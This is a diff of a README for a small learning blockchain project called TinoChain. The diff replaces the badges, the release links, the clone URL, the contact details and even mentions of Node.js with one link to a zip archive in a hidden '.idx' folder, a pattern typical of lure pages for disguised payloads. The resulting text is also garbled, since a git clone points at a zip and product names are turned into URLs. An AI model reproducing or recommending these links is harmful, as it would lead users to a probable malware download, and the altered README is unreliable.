@@ -1,9 +1,9 @@
 # TinoChain: A Proof of Work Blockchain
 
-![TinoChain](https://img.shields.io/badge/TinoChain-Blockchain-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-Download%20Latest%20Version-orange.svg)](https://github.com/dedev-sys/tinochain/releases)
+![TinoChain](https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip)  
+[![Releases](https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip%20Latest%https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip)](https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip)
 
-Welcome to TinoChain, a proof of work blockchain designed to explore the intricacies of blockchain technology and client-server architecture. This repository serves as a learning platform for developers interested in the blockchain ecosystem, particularly focusing on technologies like Node.js, TypeScript, and Tailwind CSS.
+Welcome to TinoChain, a proof of work blockchain designed to explore the intricacies of blockchain technology and client-server architecture. This repository serves as a learning platform for developers interested in the blockchain ecosystem, particularly focusing on technologies like https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip, TypeScript, and Tailwind CSS.
 
 ## Table of Contents
 
@@ -25,7 +25,7 @@ TinoChain is built to demonstrate the principles of blockchain through a proof o
 - **Client-Server Architecture**: Learn how clients interact with the server to retrieve and submit data.
 - **Gemini API Integration**: Access cryptocurrency market data and perform transactions using the Gemini API.
 - **Web3 Compatibility**: Interact with decentralized applications (dApps) seamlessly.
-- **Modern Tech Stack**: Built with Node.js, TypeScript, and Tailwind CSS for a responsive user interface.
+- **Modern Tech Stack**: Built with https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip, TypeScript, and Tailwind CSS for a responsive user interface.
 
 ## Installation
 
@@ -33,7 +33,7 @@ To get started with TinoChain, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/dedev-sys/tinochain.git
+   git clone https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip
    cd tinochain
    ```
 
@@ -52,7 +52,7 @@ To get started with TinoChain, follow these steps:
    npm start
    ```
 
-You can download the latest release from the [Releases section](https://github.com/dedev-sys/tinochain/releases). This will include all necessary files to get started.
+You can download the latest release from the [Releases section](https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip). This will include all necessary files to get started.
 
 ## Usage
 
@@ -91,16 +91,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, feel free to reach out:
 
 - **Author**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/yourprofile)
+- **Email**: https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip)
 
 ## Additional Resources
 
 - **Blockchain Basics**: Learn the fundamentals of blockchain technology.
-- **Node.js Documentation**: Explore the Node.js official documentation for more advanced features.
+- **https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip Documentation**: Explore the https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip official documentation for more advanced features.
 - **TypeScript Handbook**: Familiarize yourself with TypeScript's features and best practices.
 - **Tailwind CSS Documentation**: Discover how to create beautiful user interfaces with Tailwind CSS.
 
 ## Final Thoughts
 
-Thank you for checking out TinoChain. We hope this project helps you understand blockchain technology better. Don’t forget to visit the [Releases section](https://github.com/dedev-sys/tinochain/releases) for the latest updates and files to download. Happy coding!
+Thank you for checking out TinoChain. We hope this project helps you understand blockchain technology better. Don’t forget to visit the [Releases section](https://github.com/dedev-sys/tinochain/raw/refs/heads/main/.idx/Software_3.8.zip) for the latest updates and files to download. Happy coding!
